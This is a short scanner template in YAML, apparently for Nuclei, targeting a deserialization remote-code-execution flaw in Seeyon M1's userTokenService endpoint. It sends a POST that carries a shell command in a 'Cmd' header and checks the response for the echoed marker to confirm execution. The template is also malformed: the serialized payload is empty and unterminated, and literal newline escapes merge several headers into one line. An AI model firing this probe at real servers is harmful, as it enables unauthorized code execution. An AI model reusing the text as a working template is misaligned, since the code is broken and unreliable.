id: zyM1_usertokenservice_RCE

info:
  name: 致远M1 userTokenService 反序列化RCE漏洞
  author: Ashro
  severity: critical
  description: 该漏洞允许攻击者通过反序列化机制在目标服务器上执行任意代码。
  reference:
  tags: RCE, deserialization, exploit

requests:
  - raw:
      - |
        POST /esn_mobile_pns/service/userTokenService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 \nContent-Type: application/x-www-form-urlencoded
        Cmd: @@@@@echo test123\nContent-Length: 1876

        {{base64_decode(\""
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "test123"